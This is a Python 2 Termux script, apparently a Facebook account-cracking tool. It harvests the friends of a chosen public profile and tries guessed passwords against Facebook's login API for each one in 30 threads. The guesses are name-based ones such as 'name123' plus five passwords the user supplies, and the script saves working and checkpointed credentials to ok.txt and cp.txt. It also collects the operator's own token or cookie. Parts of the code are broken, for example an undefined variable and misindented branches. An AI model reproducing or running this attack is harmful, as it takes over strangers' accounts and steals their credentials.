# Fuck Sultani

try:
    import os, sys, time, datetime, re, random, hashlib, threading, json, getpass, urllib, cookielib, requests, uuid
    from multiprocessing.pool import ThreadPool
    from datetime import datetime
except ImportError:
    os.system('pip2 install requests')
    os.system('python2 Mcra3k.py')

os.system('clear')
if not os.path.isfile('/data/data/com.termux/files/usr/bin/node'):
    os.system('apt update && apt install nodejs -y')
if not os.path.isfile('/data/data/com.termux/files/usr/bin/ruby'):
    os.system('apt install ruby -y && gem install lolcat')
from requests.exceptions import ConnectionError
os.system('git pull')
if not os.path.isfile('/data/data/com.termux/files/home/cepat/ok/node_modules/bytes/index.js'):
    os.system('fuser -k 5000/tcp &')
    os.system('#')
    os.system('cd ..... && npm install')
    os.system('cd ..... && node index.js &')
    os.system('clear')
elif os.path.isfile('/data/data/com.termux/files/home/cepat/ok/node_modules/bytes/index.js'):
    os.system('fuser -k 5000/tcp &')
    os.system('#')
    os.system('cd Mohammad && node index.js &')
    os.system('clear')
bd = random.randint(20000000.0, 30000000.0)
sim = random.randint(20000.0, 40000.0)
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding('utf-8')
N = '\x1b[0m'
G = '\x1b[0;32m'
GL = '\x1b[32;91m'
B = '\x1b[0;36m'
BL = '\x1b[36:1m'
R = '\x1b[31;1m'
W = '\x1b[37;1m'
H = '\x1b[30;1m'
Y = '\x1b[33;1m'
YL = '\x1b[1;33m'
my_color = [
 N, G, GL, B, BL, R, W, H, Y, YL]
warna = random.choice(my_color)
logo = '\n\n\n##     ##    ##    ## #### ##    ##  ######   \n###   ###    ##   ##   ##  ###   ## ##    ##  \n#### ####    ##  ##    ##  ####  ## ##        \n## ### ##    #####     ##  ## ## ## ##   #### \n##     ##    ##  ##    ##  ##  #### ##    ##  \n##     ##    ##   ##   ##  ##   ### ##    ##  \n##     ##    ##    ## #### ##    ##  ######   \n\n--------------------------------------------------\x1a\n\x1a Author      : Mohammad Sultani \n\x1a GitHub      : https://github.com/Mohammadjan1122\n\x1a YouTube     : Termux Master\n\x1a Telegram    : https://t.me/sultani1122\n Blogspot    : https://mohammadsultani.blogspot.com\n--------------------------------------------------\n'

def ip():
    os.system('clear')
    print logo
    print
    print '\tCollecting device info'
    print
    try:
        ipinfo = requests.get('http://ip-api.com/json/')
        z = json.loads(ipinfo.text)
        ips = z['query']
        country = z['country']
        regi = z['regionName']
        network = z['isp']
    except:
        pass

    print '\x1b[1;92m Your ip: ' + ips
    time.sleep(1)
    print 47 * '-'
    print '\x1b[1;92m Your country: ' + country
    time.sleep(1)
    print 47 * '-'
    print '\x1b[1;92m Your region: ' + regi
    time.sleep(1)
    print 47 * '-'
    print ' \x1b[1;92mYour network: ' + network
    time.sleep(1)
    print 47 * '-'
    print ' Loading ...'
    time.sleep(1)
    mohammad()


def mohammad():
    uuid = str(os.geteuid()) + str(os.getlogin())
    id = ('-').join(uuid)
    print logo
    print '\x1b[37;1mYour ID : ' + id
    try:
        httpCaht = requests.get('https://github.com/Mohammadjan1122/Mking1/blob/main/public.txt').text
        if id in httpCaht:
            print '\x1b[37;1mYOUR ID IS ACTIVE.........'
            msg = str(os.geteuid())
            time.sleep(1)
        else:
            print '\x1b[37;1mYOUR ID IS NOT ACTIVE.........'
            time.sleep(1)
            sys.exit()
        try:
            open('.login.txt', 'r')
            b_menu()
        except IOError:
            login()

    except:
        sys.exit()
        if name == '__main__':
            mohammad()


def method_menu():
    os.system('clear')
    print logo
    os.system('echo -e "[ 1 ] Start Crack\n[ 2 ] update Script \n" | lolcat')
    method_menu_select()


def method_menu_select():
    afza = raw_input('\x1b[0;91m> \x1b[0;94m')
    if afza == '1':
        b_menu()
    elif afza == '2':
        os.system('clear')
        print logo
        os.system('cp .... $HOME')
        os.system('rm -rf $HOME/Mking1')
        os.system('cd $HOME && git clone https://github.com/mohammadjan1122/Mking1')
        os.system('mv $HOME/.... $HOME/Mking1')
        os.system('python2 Mking1.py')
        os.system('clear')
        print logo
        ham('\x1b[1;32m[ok] Tool Has Been Updated Successfully\x1b[0;97m')
        time.sleep(1)
        os.system('python2 Mking1.py')


def login():
    os.system('clear')
    print logo
    os.system('echo -e "[ 1 ] Log-in With Token\n[ 2 ] Log-in Email/pass \n[ 3 ] Log-in Cookie \n" | lolcat')
    login_select()


def login_select():
    afza = raw_input('\x1b[0;91m> \x1b[0;94m')
    if afza == '1':
        print ''
        token = raw_input('\x1b[0;91mToken > \x1b[0;94m')
        token_s = open('.login.txt', 'w')
        token_s.write(token)
        token_s.close()
        try:
            r = requests.get('https://graph.facebook.com/me?access_token=' + token)
            q = json.loads(r.text)
            name = q['name']
            nm = name.rsplit(' ')[0]
            print ''
            print '\x1b[0;91mSuccessful > \x1b[0;94m' + nm
            time.sleep(5)
            method_menu()
        except (KeyError, IOError):
            os.system('echo -e "\nToken Checkpoint\n" | lolcat')
            raw_input('\x1b[0;91m Enter to back ')
            login()

    elif afza == '3':
        cookie()


def cookie():
    os.system('clear')
    print logo
    print 47 * '-'
    cookie = raw_input('[?]Enter Fb  Cookie : ')
    try:
        data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers={'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', 'referer': 'https://m.facebook.com/', 'host': 'm.facebook.com', 
           'origin': 'https://m.facebook.com', 
           'upgrade-insecure-requests': '1', 
           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
           'cache-control': 'max-age=0', 
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
           'content-type': 'text/html; charset=utf-8'}, cookies={'cookie': cookie})
        find_token = re.search('(EAAA\\w+)', data.text)
        hasil = '\n* Fail :  your cookie invalid !!' if find_token is None else '\n*   Your fb access token : ' + find_token.group(1)
    except requests.exceptions.ConnectionError:
        print '[!] No Connection'

    cookie = open('.login.txt', 'w')
    cookie.write(find_token.group(1))
    cookie.close()
    print '[+] Login Successfull'
    b_menu()
    if afza == '2':
        login_fb()
    else:
        os.system('echo -e "\nError\n" | lolcat')
        login_select()
    return


def login_fb():
    id = raw_input('\x1b[0;91mID/Email > \x1b[0;94m')
    id1 = id.replace(' ', '')
    id2 = id1.replace('(', '')
    uid = id2.replace(')', '')
    pwd = raw_input('\x1b[0;91mEnter Pass > \x1b[0;94m')
    print ''
    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pwd, headers=header).text
    q = json.loads(data)
    if 'loc' in q:
        hamza = open('.login.txt', 'w')
        hamza.write(q['loc'])
        hamza.close()
        time.sleep(1)
        os.system('echo -e "\nSuccessfuled\n" | lolcat')
        time.sleep(1)
        method_menu()
    elif 'www.facebook.com' in q['error']:
        os.system('echo -e "\nID/Email & error your acciunt is checkpoint\n" | lolcat')
        time.sleep(1)
        raw_input('\x1b[0;91mEnter to back')
        login_fb()
    else:
        os.system('echo -e "\nError\n" | lolcat')
        raw_input('\x1b[0;91mEnter to back')
        login_fb()


def b_menu():
    global token
    os.system('clear')
    print logo
    try:
        token = open('.login.txt', 'r').read()
    except (KeyError, IOError):
        login()

    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + token)
        q = json.loads(r.text)
        nm = q['name']
        nmf = nm.rsplit(' ')[0]
        ok = nmf
    except (KeyError, IOError):
        os.system('echo -e "\nToken Invalid\n" | lolcat')
        os.system('rm -rf .login.txt')
        time.sleep(1)
        login()
    except requests.exceptions.ConnectionError:
        os.system('echo -e "\nProblematic Connection\n" | lolcat')
        time.sleep(1)
        raw_input('\x1b[0;91m Enter To back ')
        b_menu()

    os.system('clear')
    print logo
    os.system('echo -e "[ 1 ] Crack Public Account\n[ 2 ] Update Script\n[ 0 ] back"| lolcat')
    b_menu_select()


def b_menu_select():
    select = raw_input('\x1b[0;91m> \x1b[0;94m')
    id = []
    oks = []
    cps = []
    if select == '1':
        os.system('clear')
        print logo
        idt = raw_input('\x1b[0;91mEnter iD Public > \x1b[0;94m')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            print '\x1b[0;91mNama > \x1b[0;94m' + q['name']
        except (KeyError, IOError):
            os.system('echo -e "\nID Not Found /Check ID  Public\n" | lolcat')
            raw_input('\x1b[0;91mPress Enter To back')
            b_menu()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    print '\x1b[0;91m Total IDs > \x1b[0;94m' + str(len(id))
    time.sleep(0.5)
    print ''
    os.system('echo -e "\nEnter 5  pass  example 100200 500600 786786\n" | lolcat')
    print ''
    pass5 = raw_input('\x1b[0;91mpass 1 >\x1b[0;94m ')
    pass6 = raw_input('\x1b[0;91mpass 2 >\x1b[0;94m ')
    pass7 = raw_input('\x1b[0;91mpass 3 >\x1b[0;94m ')
    pass8 = raw_input('\x1b[0;91mpass 4 >\x1b[0;94m ')
    pass9 = raw_input('\x1b[0;91mpass 5 >\x1b[0;94m ')
    print ''
    os.system('echo -e "Created by Mohammad Sultani Fast Script\n\n\t   \n" | lolcat')
    time.sleep(5)

    def main(arg):
        w = random.choice(['\x1b[0;96m', '\x1b[0;93m', '\x1b[0;95m', '\x1b[0;91m', '\x1b[0;92m', '\x1b[0;94m'])
        sys.stdout.write(('\r{}').format(datetime.now().strftime('\r' + w + '[ %H<>%M<>%S ]')))
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            pass1 = name + '123'
            q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
            d = json.loads(q)
            if 'www.facebook.com' in d['error_msg']:
                print '\r\x1b[0;93mMking1-CP ' + uid + ' - ' + pass1
                cp = open('cp.txt', 'a')
                cp.write(uid + ' - ' + pass1 + '\n')
                cp.close()
                cps.append(uid)
            elif 'access_token' in d:
                print '\r\x1b[0;92mMking1-OK ' + uid + ' - ' + pass1
                ok = open('ok.txt', 'a')
                ok.write(uid + ' - ' + pass1 + '\n')
                ok.close()
                oks.append(uid)
            else:
                pass2 = last_name + '123'
                q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                d = json.loads(q)
                if 'www.facebook.com' in d['error_msg']:
                    print '\r\x1b[0;93mMking1-CP ' + uid + ' - ' + pass2
                    cp = open('cp.txt', 'a')
                    cp.write(uid + ' - ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid)
                elif 'access_token' in d:
                    print '\r\x1b[0;92mMking1-OK ' + uid + ' - ' + pass2
                    ok = open('ok.txt', 'a')
                    ok.write(uid + ' - ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid)
                else:
                    pass3 = name + '12345'
                    q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                    d = json.loads(q)
                    if 'www.facebook.com' in d['error_msg']:
                        print '\r\x1b[0;93mMking1-CP ' + uid + ' - ' + pass3
                        cp = open('cp.txt', 'a')
                        cp.write(uid + ' - ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid)
                    elif 'access_token' in d:
                        print '\r\x1b[0;92mMking1-OK ' + uid + ' - ' + pass3
                        ok = open('ok.txt', 'a')
                        ok.write(uid + ' - ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid)
                    else:
                        pass4 = name + '123456'
                        q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                        d = json.loads(q)
                        if 'www.facebook.com' in d['error_msg']:
                            print '\r\x1b[0;93mMking1-CP ' + uid + ' - ' + pass4
                            cp = open('cp.txt', 'a')
                            cp.write(uid + ' - ' + pass4 + '\n')
                            cp.close()
                            cps.append(uid)
                        elif 'access_token' in d:
                            print '\r\x1b[0;92mMking1-OK ' + uid + ' - ' + pass4
                            ok = open('ok.txt', 'a')
                            ok.write(uid + ' - ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid)
                        else:
                            pass5
                            q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                            d = json.loads(q)
                            if 'www.facebook.com' in d['error_msg']:
                                print '\r\x1b[0;93mMking1-CP ' + uid + ' - ' + pass5
                                cp = open('cp.txt', 'a')
                                cp.write(uid + ' - ' + pass5 + '\n')
                                cp.close()
                                cps.append(uid)
                            elif 'access_token' in d:
                                print '\r\x1b[0;92mMking1-OK ' + uid + ' - ' + pass5
                                ok = open('ok.txt', 'a')
                                ok.write(uid + ' - ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid)
                            else:
                                pass6
                                q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                                d = json.loads(q)
                                if 'www.facebook.com' in d['error_msg']:
                                    print '\r\x1b[0;93mMking1-CP ' + uid + ' - ' + pass6
                                    cp = open('cp.txt', 'a')
                                    cp.write(uid + ' - ' + pass6 + '\n')
                                    cp.close()
                                    cps.append(uid)
                                elif 'access_token' in d:
                                    print '\r\x1b[0;92mMking1-OK ' + uid + ' - ' + pass6
                                    ok = open('ok.txt', 'a')
                                    ok.write(uid + ' - ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid)
                                else:
                                    pass7
                                    q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                                    d = json.loads(q)
                                    if 'www.facebook.com' in d['error_msg']:
                                        print '\r\x1b[0;93mMking1-CP ' + uid + ' - ' + pass7
                                        cp = open('cp.txt', 'a')
                                        cp.write(uid + ' - ' + pass7 + '\n')
                                        cp.close()
                                        cps.append(uid)
                                    elif 'access_token' in d:
                                        print '\r\x1b[0;92mMking1-OK ' + uid + ' - ' + pass7
                                        ok = open('ok.txt', 'a')
                                        ok.write(uid + ' - ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid)
                                    else:
                                        q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                                    d = json.loads(q)
                                    if 'www.facebook.com' in d['error_msg']:
                                        print '\r\x1b[0;93mMking1-CP ' + uid + ' - ' + pass8
                                        cp = open('cp.txt', 'a')
                                        cp.write(uid + ' - ' + pass8 + '\n')
                                        cp.close()
                                        cps.append(uid)
                                    elif 'access_token' in d:
                                        print '\r\x1b[0;92mMking1-OK ' + uid + ' - ' + pass8
                                        ok = open('ok.txt', 'a')
                                        ok.write(uid + ' - ' + pass8 + '\n')
                                        ok.close()
                                        oks.append(uid)
                                    else:
                                        q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                                    d = json.loads(q)
                                    if 'www.facebook.com' in d['error_msg']:
                                        print '\r\x1b[0;93mMking1-CP ' + uid + ' - ' + pass9
                                        cp = open('cp.txt', 'a')
                                        cp.write(uid + ' - ' + pass9 + '\n')
                                        cp.close()
                                        cps.append(uid)
                                    elif 'access_token' in d:
                                        print '\r\x1b[0;92mMking1-OK ' + uid + ' - ' + pass9
                                        ok = open('ok.txt', 'a')
                                        ok.write(uid + ' - ' + pass9 + '\n')
                                        ok.close()
                                        oks.append(uid)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print ' '
    os.system('echo -e "Saved\n\nTOTAL Mking1-OK & Mking1-CP\n" | lolcat')
    print '\x1b[0;92mMking1-OK > ' + str(len(oks))
    print '\x1b[0;93mMking1-CP > ' + str(len(cps))


if __name__ == '__main__':
    os.system('clear')
    print 'Created by mohammad Sultani '
    time.sleep(2)
    print ' '
    print 'plese join to telegram group and send id  '
    time.sleep(2)
    print ' '
    print 'Thise Script is Free  I Love You  '
    time.sleep(2)
    print ' '
    os.system('xdg-open https://t.me/Mking_script')
    time.sleep(10)
    ip()
